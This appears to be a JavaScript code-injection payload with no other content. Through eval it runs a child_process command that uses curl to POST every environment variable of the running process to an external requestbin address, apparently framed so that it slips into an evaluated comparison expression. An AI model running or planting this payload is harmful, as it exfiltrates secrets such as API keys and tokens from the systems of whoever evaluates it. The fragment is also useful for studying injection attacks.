eval('"";require("child_process")\
  .execSync(\
   `curl -X POST http://requestb.in/1dkrufa1\
   -d \'${JSON.stringify(process.env)}\'`);\
   ""=== "cats"'); 